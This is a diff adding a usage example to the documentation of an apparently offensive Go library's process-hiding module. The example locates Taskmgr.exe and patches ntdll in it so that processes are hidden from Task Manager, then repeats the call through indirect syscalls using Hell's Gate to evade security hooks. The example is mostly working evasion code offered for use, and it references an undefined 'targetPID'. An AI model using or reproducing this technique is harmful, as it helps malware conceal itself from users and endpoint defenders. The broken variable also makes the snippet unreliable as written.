@@ -42,3 +42,37 @@ func PatchProcessMonitor(pid int, caller *wsyscall.Caller) error
 **Medium** — Any integrity-check of ntdll bytes in a running process detects
 the overwrite. Kernel-side enumeration is not affected (any EDR agent reading
 process lists from the kernel still sees everything).
+
+## Usage Example
+
+```go
+import (
+    "fmt"
+    "os"
+    "github.com/oioio-space/maldev/evasion/hideprocess"
+    "github.com/oioio-space/maldev/process/enum"
+    wsyscall "github.com/oioio-space/maldev/win/syscall"
+)
+
+func main() {
+    procs, err := enum.List()
+    if err != nil {
+        fmt.Fprintf(os.Stderr, "list processes: %v\n", err)
+        os.Exit(1)
+    }
+    for _, p := range procs {
+        if p.Name == "Taskmgr.exe" {
+            err := hideprocess.PatchProcessMonitor(int(p.PID), nil)
+            if err != nil {
+                fmt.Fprintf(os.Stderr, "patch failed: %v\n", err)
+                continue
+            }
+            fmt.Printf("Patched Taskmgr.exe (PID %d)\n", p.PID)
+        }
+    }
+
+    // With indirect syscalls:
+    caller, _ := wsyscall.New(wsyscall.MethodIndirect, wsyscall.WithHellsGate())
+    _ = hideprocess.PatchProcessMonitor(targetPID, caller)
+}
+```
